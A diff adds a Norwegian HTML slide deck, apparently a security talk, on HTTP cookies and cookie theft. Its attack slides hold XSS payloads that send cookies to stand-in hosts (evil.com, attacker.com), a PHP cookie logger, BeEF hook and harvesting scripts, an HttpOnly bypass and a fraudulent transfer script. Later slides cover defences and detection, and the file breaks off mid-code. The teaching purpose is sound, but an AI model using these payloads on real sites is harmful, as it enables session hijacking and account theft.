@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies & Cookie Stealing - Sikkerhetspresentasjon</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .presentation-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 1200px;
+            height: 80vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .slide {
+            display: none;
+            padding: 60px;
+            height: calc(80vh - 80px);
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            display: block;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .slide h1 {
+            color: #f5576c;
+            font-size: 3em;
+            margin-bottom: 30px;
+            text-align: center;
+            border-bottom: 3px solid #f093fb;
+            padding-bottom: 20px;
+        }
+
+        .slide h2 {
+            color: #f093fb;
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            margin-top: 30px;
+        }
+
+        .slide h3 {
+            color: #f5576c;
+            font-size: 1.6em;
+            margin-bottom: 15px;
+            margin-top: 25px;
+        }
+
+        .slide p, .slide li {
+            font-size: 1.2em;
+            line-height: 1.8;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .slide ul {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+
+        .code-example {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .code-example .comment {
+            color: #6272a4;
+        }
+
+        .code-example .string {
+            color: #f1fa8c;
+        }
+
+        .code-example .keyword {
+            color: #ff79c6;
+        }
+
+        .code-example .number {
+            color: #bd93f9;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .success-box {
+            background: #d4edda;
+            border-left: 5px solid #28a745;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .danger-box {
+            background: #f8d7da;
+            border-left: 5px solid #dc3545;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .info-box {
+            background: #d1ecf1;
+            border-left: 5px solid #17a2b8;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .navigation {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #f8f9fa;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 2px solid #dee2e6;
+        }
+
+        .nav-button {
+            background: #f093fb;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+
+        .nav-button:hover {
+            background: #f5576c;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .nav-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .slide-counter {
+            font-size: 1.1em;
+            color: #666;
+            font-weight: bold;
+        }
+
+        .diagram {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #f093fb;
+            margin: 10px 0;
+        }
+
+        .intro-slide {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .intro-slide h1 {
+            color: white;
+            border-bottom: 3px solid white;
+            font-size: 4em;
+        }
+
+        .intro-slide p {
+            color: white;
+            font-size: 1.5em;
+        }
+
+        .cookie-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .cookie-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 5px solid #f093fb;
+            transition: transform 0.3s ease;
+        }
+
+        .cookie-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .beef-attack {
+            background: linear-gradient(135deg, #2d2d2d, #1a1a1a);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .beef-attack h3 {
+            color: #ffc107;
+        }
+
+        .beef-attack p, .beef-attack li {
+            color: #f8f8f2;
+        }
+
+        .cookie-visual {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .cookie-icon {
+            font-size: 4em;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        th {
+            background: #f093fb;
+            color: white;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .attack-timeline {
+            position: relative;
+            padding: 20px 0;
+        }
+
+        .timeline-item {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 3px solid #f5576c;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: attr(data-step);
+            position: absolute;
+            left: -40px;
+            background: #f5576c;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="presentation-container">
+        <!-- Slide 1: Introduksjon -->
+        <div class="slide intro-slide active">
+            <h1>🍪 Cookies & Cookie Stealing</h1>
+            <p>Forstå, utnytte og beskytte mot cookie-baserte angrep</p>
+            <br><br>
+            <p style="font-size: 1.2em;">📚 Tell & Show - Sikkerhetspresentasjon</p>
+            <p style="font-size: 1em; margin-top: 20px;">BeEF Framework & Praktisk Eksploitering</p>
+        </div>
+
+        <!-- Slide 2: Hva er Cookies? -->
+        <div class="slide">
+            <h1>Hva er HTTP Cookies?</h1>
+            
+            <h2>Definisjon</h2>
+            <p>HTTP cookies er små tekstfiler som nettsteder lagrer på brukerens datamaskin for å huske informasjon mellom besøk og HTTP-forespørsler.</p>
+            
+            <div class="cookie-visual">
+                <div>
+                    <div class="cookie-icon">🌐</div>
+                    <p>Nettsted</p>
+                </div>
+                <div class="flow-arrow">→</div>
+                <div>
+                    <div class="cookie-icon">🍪</div>
+                    <p>Cookie</p>
+                </div>
+                <div class="flow-arrow">→</div>
+                <div>
+                    <div class="cookie-icon">💻</div>
+                    <p>Brukers PC</p>
+                </div>
+            </div>
+            
+            <h3>Hovedformål:</h3>
+            <ul>
+                <li><strong>Session Management:</strong> Innlogging, handlekurv, spillresultater</li>
+                <li><strong>Personalisering:</strong> Brukerpreferanser, tema, språk</li>
+                <li><strong>Tracking:</strong> Analyser brukeratferd, reklame</li>
+            </ul>
+            
+            <div class="info-box">
+                <strong>📊 Fakta:</strong> En gjennomsnittlig nettside setter 20+ cookies, og de fleste brukere har 1000+ cookies lagret i nettleseren sin!
+            </div>
+        </div>
+
+        <!-- Slide 3: Cookie Anatomi -->
+        <div class="slide">
+            <h1>Anatomien av en Cookie</h1>
+            
+            <h2>Cookie Struktur</h2>
+            <div class="code-example">
+                <span class="comment">// Eksempel på en cookie header</span><br>
+                Set-Cookie: sessionId=abc123xyz; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Domain=.example.com; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Path=/; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Expires=Wed, 21 Oct 2025 07:28:00 GMT; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Secure; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;HttpOnly; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;SameSite=Strict
+            </div>
+            
+            <h2>Cookie Attributter</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Attributt</th>
+                        <th>Beskrivelse</th>
+                        <th>Sikkerhetsimplikasjon</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Domain</strong></td>
+                        <td>Hvilke domener som kan lese cookien</td>
+                        <td>Bred domain = større angrepsflate</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Path</strong></td>
+                        <td>URL-sti hvor cookie er gyldig</td>
+                        <td>Spesifikk path = bedre isolasjon</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Expires/Max-Age</strong></td>
+                        <td>Når cookie utløper</td>
+                        <td>Persistent vs session cookies</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Secure</strong></td>
+                        <td>Kun over HTTPS</td>
+                        <td>Beskytter mot nettverks-sniffing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>HttpOnly</strong></td>
+                        <td>Ikke tilgjengelig via JavaScript</td>
+                        <td>Beskytter mot XSS</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SameSite</strong></td>
+                        <td>CSRF beskyttelse</td>
+                        <td>Strict/Lax/None</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Slide 4: Cookie Typer -->
+        <div class="slide">
+            <h1>Cookie Typer og Sikkerhet</h1>
+            
+            <div class="cookie-types">
+                <div class="cookie-card">
+                    <h3>🔑 Session Cookies</h3>
+                    <p><strong>Levetid:</strong> Kun under nettleser-sesjon</p>
+                    <p><strong>Formål:</strong> Midlertidig autentisering</p>
+                    <p><strong>Risiko:</strong> Session hijacking</p>
+                    <div class="code-example">
+                        PHPSESSID=a3fWa2kl9z
+                    </div>
+                </div>
+                
+                <div class="cookie-card">
+                    <h3>💾 Persistent Cookies</h3>
+                    <p><strong>Levetid:</strong> Dager/måneder/år</p>
+                    <p><strong>Formål:</strong> "Remember me", preferanser</p>
+                    <p><strong>Risiko:</strong> Langvarig eksponering</p>
+                    <div class="code-example">
+                        remember_token=eyJhbGc...
+                    </div>
+                </div>
+                
+                <div class="cookie-card">
+                    <h3>🎯 Tracking Cookies</h3>
+                    <p><strong>Levetid:</strong> Varierer</p>
+                    <p><strong>Formål:</strong> Analysere brukeratferd</p>
+                    <p><strong>Risiko:</strong> Personvern</p>
+                    <div class="code-example">
+                        _ga=GA1.2.123456789
+                    </div>
+                </div>
+                
+                <div class="cookie-card">
+                    <h3>🔐 Authentication Cookies</h3>
+                    <p><strong>Levetid:</strong> Session eller persistent</p>
+                    <p><strong>Formål:</strong> Bevise identitet</p>
+                    <p><strong>Risiko:</strong> KRITISK - fullt kontotilgang</p>
+                    <div class="code-example">
+                        auth_token=JWT.token.here
+                    </div>
+                </div>
+            </div>
+            
+            <div class="danger-box">
+                <strong>⚠️ Viktig:</strong> Authentication cookies er gull for angripere - de gir direkte tilgang til brukerkontoer!
+            </div>
+        </div>
+
+        <!-- Slide 5: Cookie Stealing Metoder -->
+        <div class="slide">
+            <h1>Cookie Stealing - Angrepsvektorer</h1>
+            
+            <h2>🎯 Hovedmetoder for Cookie-tyveri</h2>
+            
+            <h3>1. Cross-Site Scripting (XSS)</h3>
+            <div class="code-example">
+                <span class="comment">// XSS payload som stjeler cookies</span><br>
+                <span class="keyword">&lt;script&gt;</span><br>
+                &nbsp;&nbsp;<span class="keyword">var</span> img = <span class="keyword">new</span> Image();<br>
+                &nbsp;&nbsp;img.src = <span class="string">'http://evil.com/steal?cookie='</span> + document.cookie;<br>
+                <span class="keyword">&lt;/script&gt;</span>
+            </div>
+            
+            <h3>2. Man-in-the-Middle (MitM)</h3>
+            <div class="warning-box">
+                <strong>Scenario:</strong> På usikret WiFi (kafé, flyplass) kan angripere sniffe nettverkstrafikk og fange cookies som sendes over HTTP.
+            </div>
+            
+            <h3>3. Session Fixation</h3>
+            <div class="code-example">
+                <span class="comment">// Angriper setter en kjent session ID</span><br>
+                http://vulnerable.com/login?PHPSESSID=attackerknowsthis
+            </div>
+            
+            <h3>4. Cross-Site Request Forgery (CSRF)</h3>
+            <div class="code-example">
+                <span class="comment">&lt;!-- Skjult form som bruker offerets cookies --&gt;</span><br>
+                <span class="keyword">&lt;img</span> src=<span class="string">"http://bank.com/transfer?to=attacker&amount=1000"</span><span class="keyword">&gt;</span>
+            </div>
+            
+            <h3>5. Malware/Browser Extensions</h3>
+            <p>Ondsinnet programvare eller nettleserutvidelser kan direkte lese alle cookies fra nettleseren.</p>
+        </div>
+
+        <!-- Slide 6: XSS Cookie Stealing Deep Dive -->
+        <div class="slide">
+            <h1>XSS Cookie Stealing - Teknisk Dybdedykk</h1>
+            
+            <h2>Steg-for-steg Angrep</h2>
+            <div class="attack-timeline">
+                <div class="timeline-item" data-step="1">
+                    <h3>Finn XSS-sårbarhet</h3>
+                    <div class="code-example">
+                        http://site.com/search?q=<span class="keyword">&lt;script&gt;</span>alert(1)<span class="keyword">&lt;/script&gt;</span>
+                    </div>
+                </div>
+                
+                <div class="timeline-item" data-step="2">
+                    <h3>Lag cookie stealer payload</h3>
+                    <div class="code-example">
+                        <span class="keyword">&lt;script&gt;</span><br>
+                        &nbsp;&nbsp;<span class="comment">// Base64 encode for å unngå problemer med spesialtegn</span><br>
+                        &nbsp;&nbsp;<span class="keyword">var</span> cookies = btoa(document.cookie);<br>
+                        &nbsp;&nbsp;<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();<br>
+                        &nbsp;&nbsp;xhr.open(<span class="string">'POST'</span>, <span class="string">'http://attacker.com/log'</span>, <span class="keyword">true</span>);<br>
+                        &nbsp;&nbsp;xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);<br>
+                        &nbsp;&nbsp;xhr.send(<span class="string">'data='</span> + cookies + <span class="string">'&url='</span> + window.location);<br>
+                        <span class="keyword">&lt;/script&gt;</span>
+                    </div>
+                </div>
+                
+                <div class="timeline-item" data-step="3">
+                    <h3>Sett opp cookie logger</h3>
+                    <div class="code-example">
+                        <span class="comment">// PHP cookie logger (attacker.com/log.php)</span><br>
+                        &lt;?php<br>
+                        &nbsp;&nbsp;$cookies = base64_decode($_POST['data']);<br>
+                        &nbsp;&nbsp;$url = $_POST['url'];<br>
+                        &nbsp;&nbsp;$ip = $_SERVER['REMOTE_ADDR'];<br>
+                        &nbsp;&nbsp;$time = date('Y-m-d H:i:s');<br>
+                        &nbsp;&nbsp;<br>
+                        &nbsp;&nbsp;$log = <span class="string">"[$time] $ip - $url\nCookies: $cookies\n\n"</span>;<br>
+                        &nbsp;&nbsp;file_put_contents(<span class="string">'stolen_cookies.txt'</span>, $log, FILE_APPEND);<br>
+                        ?&gt;
+                    </div>
+                </div>
+                
+                <div class="timeline-item" data-step="4">
+                    <h3>Bruk stjålne cookies</h3>
+                    <div class="code-example">
+                        <span class="comment">// I nettleserens console eller via extension</span><br>
+                        document.cookie = <span class="string">"PHPSESSID=stolen_session_id"</span>;<br>
+                        location.reload();
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: BeEF og Cookie Stealing -->
+        <div class="slide">
+            <h1>🥩 BeEF Framework - Cookie Stealing</h1>
+            
+            <div class="beef-attack">
+                <h3>BeEF Cookie Stealing Moduler</h3>
+                <p>BeEF har flere innebygde moduler for cookie-tyveri når en nettleser er "hooked":</p>
+                
+                <ul>
+                    <li><strong>Get Cookie:</strong> Henter alle tilgjengelige cookies</li>
+                    <li><strong>Get Session Storage:</strong> Stjeler session storage data</li>
+                    <li><strong>Get Local Storage:</strong> Henter local storage verdier</li>
+                    <li><strong>Webcam:</strong> Kan ta bilde for social engineering</li>
+                </ul>
+            </div>
+            
+            <h2>BeEF Hook med Cookie Stealer</h2>
+            <div class="code-example">
+                <span class="comment">// Utvidet BeEF hook som automatisk stjeler cookies</span><br>
+                <span class="keyword">&lt;script&gt;</span><br>
+                &nbsp;&nbsp;<span class="comment">// Last BeEF hook</span><br>
+                &nbsp;&nbsp;<span class="keyword">var</span> s = document.createElement(<span class="string">'script'</span>);<br>
+                &nbsp;&nbsp;s.type = <span class="string">'text/javascript'</span>;<br>
+                &nbsp;&nbsp;s.src = <span class="string">'http://attacker:3000/hook.js'</span>;<br>
+                &nbsp;&nbsp;document.head.appendChild(s);<br>
+                &nbsp;&nbsp;<br>
+                &nbsp;&nbsp;<span class="comment">// Send cookies når hook er lastet</span><br>
+                &nbsp;&nbsp;s.onload = <span class="keyword">function</span>() {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;beef.execute(<span class="keyword">function</span>() {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beef.net.send(<span class="string">'&lt;%= @command_url %&gt;'</span>, <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{cookies: document.cookie});<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;};<br>
+                <span class="keyword">&lt;/script&gt;</span>
+            </div>
+            
+            <h3>BeEF Admin Panel - Cookie View</h3>
+            <div class="info-box">
+                <strong>I BeEF Control Panel kan du:</strong>
+                <ul>
+                    <li>Se alle cookies fra hooked nettlesere i sanntid</li>
+                    <li>Eksportere cookies for senere bruk</li>
+                    <li>Automatisk logge alle nye cookies</li>
+                    <li>Kjøre JavaScript for å manipulere cookies</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 8: Avanserte Cookie Stealing Teknikker -->
+        <div class="slide">
+            <h1>Avanserte Cookie Stealing Teknikker</h1>
+            
+            <h2>🔥 Bypassing HttpOnly</h2>
+            <div class="warning-box">
+                <strong>Problem:</strong> HttpOnly cookies kan ikke leses via JavaScript
+            </div>
+            
+            <h3>Løsning 1: XST (Cross-Site Tracing)</h3>
+            <div class="code-example">
+                <span class="comment">// Hvis TRACE metoden er aktivert</span><br>
+                <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();<br>
+                xhr.open(<span class="string">'TRACE'</span>, <span class="string">'/'</span>, <span class="keyword">false</span>);<br>
+                xhr.send();<br>
+                <span class="comment">// Response inneholder alle headers inkludert HttpOnly cookies</span><br>
+                alert(xhr.responseText);
+            </div>
+            
+            <h3>Løsning 2: Proxy Requests</h3>
+            <div class="code-example">
+                <span class="comment">// Bruk offeret som proxy</span><br>
+                fetch(<span class="string">'/api/user-data'</span>)<br>
+                &nbsp;&nbsp;.then(r => r.text())<br>
+                &nbsp;&nbsp;.then(data => {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// Send sensitive data til angriper</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;fetch(<span class="string">'http://evil.com/log'</span>, {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: <span class="string">'POST'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: data<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;});
+            </div>
+            
+            <h2>🎭 Cookie Jar Overflow</h2>
+            <div class="code-example">
+                <span class="comment">// Overfyll cookie storage for å tvinge ut viktige cookies</span><br>
+                <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i < <span class="number">150</span>; i++) {<br>
+                &nbsp;&nbsp;document.cookie = <span class="string">`fake${i}=`</span> + <span class="string">'A'</span>.repeat(<span class="number">4000</span>) + <span class="string">'; path=/'</span>;<br>
+                }
+            </div>
+            
+            <h2>🔄 Session Riding</h2>
+            <p>Bruke stjålne cookies til å utføre handlinger på vegne av offeret:</p>
+            <div class="code-example">
+                <span class="comment">// Auto-transfer script</span><br>
+                <span class="keyword">if</span>(document.cookie.includes(<span class="string">'logged_in=true'</span>)) {<br>
+                &nbsp;&nbsp;fetch(<span class="string">'/transfer'</span>, {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;method: <span class="string">'POST'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;credentials: <span class="string">'include'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify({<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to: <span class="string">'attacker_account'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amount: <span class="number">1000</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;})<br>
+                &nbsp;&nbsp;});<br>
+                }
+            </div>
+        </div>
+
+        <!-- Slide 9: Cookie Stealing via BeEF - Praktisk Demo -->
+        <div class="slide">
+            <h1>BeEF Cookie Stealing - Praktisk Demonstrasjon</h1>
+            
+            <h2>🎯 Live Attack Scenario</h2>
+            
+            <div class="diagram">
+                <h3>Attack Flow med BeEF</h3>
+                <p><strong>1. XSS Injection</strong></p>
+                <p>↓</p>
+                <p><strong>2. BeEF Hook Loaded</strong></p>
+                <p>↓</p>
+                <p><strong>3. Browser Hooked</strong></p>
+                <p>↓</p>
+                <p><strong>4. Cookie Module Executed</strong></p>
+                <p>↓</p>
+                <p><strong>5. Cookies Exfiltrated</strong></p>
+                <p>↓</p>
+                <p><strong>6. Session Hijacked</strong></p>
+            </div>
+            
+            <h3>BeEF Commands for Cookie Theft</h3>
+            <div class="code-example">
+                <span class="comment"># I BeEF command shell</span><br>
+                <span class="comment"># List tilgjengelige moduler</span><br>
+                beef.modules.list<br><br>
+                
+                <span class="comment"># Kjør Get Cookie modul</span><br>
+                beef.execute(<span class="string">"Get Cookie"</span>, {}, zombie_id)<br><br>
+                
+                <span class="comment"># Kjør custom JavaScript</span><br>
+                beef.execute_raw(<span class="string">"""<br>
+                &nbsp;&nbsp;var allCookies = document.cookie.split(';');<br>
+                &nbsp;&nbsp;var cookieObj = {};<br>
+                &nbsp;&nbsp;allCookies.forEach(function(cookie) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var parts = cookie.trim().split('=');<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;cookieObj[parts[0]] = parts[1];<br>
+                &nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;beef.net.send('&lt;%= @command_url %&gt;', cookieObj);<br>
+                """</span>, zombie_id)
+            </div>
+            
+            <h3>Automatisert Cookie Harvesting</h3>
+            <div class="code-example">
+                <span class="comment">// Auto-harvest script for BeEF</span><br>
+                setInterval(<span class="keyword">function</span>() {<br>
+                &nbsp;&nbsp;<span class="comment">// Check for new cookies every 5 seconds</span><br>
+                &nbsp;&nbsp;<span class="keyword">var</span> currentCookies = document.cookie;<br>
+                &nbsp;&nbsp;<span class="keyword">if</span>(window.lastCookies !== currentCookies) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;beef.net.send(<span class="string">'&lt;%= @command_url %&gt;'</span>, {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookies: currentCookies,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;timestamp: <span class="keyword">new</span> Date().toISOString(),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: window.location.href<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;window.lastCookies = currentCookies;<br>
+                &nbsp;&nbsp;}<br>
+                }, <span class="number">5000</span>);
+            </div>
+        </div>
+
+        <!-- Slide 10: Beskyttelse mot Cookie Stealing -->
+        <div class="slide">
+            <h1>Beskyttelse mot Cookie Stealing</h1>
+            
+            <h2>🛡️ Forsvarslag</h2>
+            
+            <h3>1. HttpOnly Flag</h3>
+            <div class="success-box">
+                <strong>Best Practice:</strong> Alle session cookies skal ha HttpOnly flag
+            </div>
+            <div class="code-example">
+                <span class="comment">// PHP</span><br>
+                setcookie(<span class="string">'session_id'</span>, $value, [<br>
+                &nbsp;&nbsp;<span class="string">'httponly'</span> => <span class="keyword">true</span>,<br>
+                &nbsp;&nbsp;<span class="string">'secure'</span> => <span class="keyword">true</span>,<br>
+                &nbsp;&nbsp;<span class="string">'samesite'</span> => <span class="string">'Strict'</span><br>
+                ]);<br><br>
+                
+                <span class="comment">// Node.js/Express</span><br>
+                res.cookie(<span class="string">'session'</span>, sessionId, {<br>
+                &nbsp;&nbsp;httpOnly: <span class="keyword">true</span>,<br>
+                &nbsp;&nbsp;secure: <span class="keyword">true</span>,<br>
+                &nbsp;&nbsp;sameSite: <span class="string">'strict'</span><br>
+                });
+            </div>
+            
+            <h3>2. Secure Flag</h3>
+            <div class="info-box">
+                <strong>Regel:</strong> Cookies sendes kun over HTTPS-forbindelser
+            </div>
+            
+            <h3>3. SameSite Attribute</h3>
+            <table>
+                <tr>
+                    <th>Verdi</th>
+                    <th>Beskyttelse</th>
+                </tr>
+                <tr>
+                    <td><strong>Strict</strong></td>
+                    <td>Cookie sendes aldri cross-site</td>
+                </tr>
+                <tr>
+                    <td><strong>Lax</strong></td>
+                    <td>Kun med top-level navigation</td>
+                </tr>
+                <tr>
+                    <td><strong>None</strong></td>
+                    <td>Ingen beskyttelse (krever Secure)</td>
+                </tr>
+            </table>
+            
+            <h3>4. Content Security Policy</h3>
+            <div class="code-example">
+                <span class="comment">&lt;!-- Blokkér inline scripts og eksterne domener --&gt;</span><br>
+                Content-Security-Policy: <br>
+                &nbsp;&nbsp;default-src <span class="string">'self'</span>;<br>
+                &nbsp;&nbsp;script-src <span class="string">'self'</span> <span class="string">'nonce-random123'</span>;<br>
+                &nbsp;&nbsp;connect-src <span class="string">'self'</span>
+            </div>
+        </div>
+
+        <!-- Slide 11: Cookie Security Best Practices -->
+        <div class="slide">
+            <h1>Cookie Security Best Practices</h1>
+            
+            <h2>🔐 Implementer Defense in Depth</h2>
+            
+            <div class="cookie-card">
+                <h3>Session Management</h3>
+                <ul>
+                    <li>Regenerer session ID ved login</li>
+                    <li>Kort session timeout (15-30 min inaktivitet)</li>
+                    <li>Valider session på server-side</li>
+                    <li>Bind session til IP/User-Agent</li>
+                </ul>
+                <div class="code-example">
+                    <span class="comment">// PHP session regeneration</span><br>
+                    session_regenerate_id(<span class="keyword">true</span>);<br>
+                    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];<br>
+                    $_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
+                </div>
+            </div>
+            
+            <div class="cookie-card">
+                <h3>Token-basert Autentisering</h3>
+                <ul>
+                    <li>Bruk JWT med kort levetid</li>
+                    <li>Refresh tokens i HttpOnly cookies</li>
+                    <li>Access tokens i memory/sessionStorage</li>
+                </ul>
+                <div class="code-example">
+                    <span class="comment">// Secure JWT implementation</span><br>
+                    {<br>
+                    &nbsp;&nbsp;<span class="string">"exp"</span>: <span class="number">1635789234</span>, <span class="comment">// 15 min expiry</span><br>
+                    &nbsp;&nbsp;<span class="string">"jti"</span>: <span class="string">"unique-token-id"</span>,<br>
+                    &nbsp;&nbsp;<span class="string">"fingerprint"</span>: <span class="string">"hashed-fingerprint"</span><br>
+                    }
+                </div>
+            </div>
+            
+            <h3>Cookie Prefixes</h3>
+            <div class="code-example">
+                <span class="comment">// __Secure- prefix: må ha Secure flag og settes fra HTTPS</span><br>
+                Set-Cookie: __Secure-ID=123; Secure; Domain=example.com<br><br>
+                
+                <span class="comment">// __Host- prefix: strengeste - ingen Domain, må ha Path=/</span><br>
+                Set-Cookie: __Host-ID=123; Secure; Path=/; SameSite=Strict
+            </div>
+            
+            <div class="warning-box">
+                <strong>⚠️ Testing:</strong> Bruk verktøy som OWASP ZAP eller Burp Suite for å teste cookie-sikkerhet
+            </div>
+        </div>
+
+        <!-- Slide 12: Monitoring og Detection -->
+        <div class="slide">
+            <h1>Oppdage Cookie Stealing Forsøk</h1>
+            
+            <h2>🔍 Deteksjon Strategier</h2>
+            
+            <h3>1. Client-Side Monitoring</h3>
+            <div class="code-example">
+                <span class="comment">// Overvåk for mistenkelig JavaScript</span><br>
+                (<span class="keyword">function</span>() {<br>
+                &nbsp;&nbsp;<span class="keyword">var</span> originalCookie = Object.getOwnPropertyDescriptor(<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Document.prototype, <span class="string">'cookie'</span><br>
+                &nbsp;&nbsp;);<br>
+                &nbsp;&nbsp;<br>
+                &nbsp;&nbsp;Object.defineProperty(document, <span class="string">'cookie'</span>, {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;get: <span class="keyword">function</span>() {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// Log cookie access</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.warn(<span class="string">'Cookie accessed!'</span>, <span class="keyword">new</span> Error().stack);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span> originalCookie.get.call(document);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;set: <span class="keyword">function</span>(val) {<br>
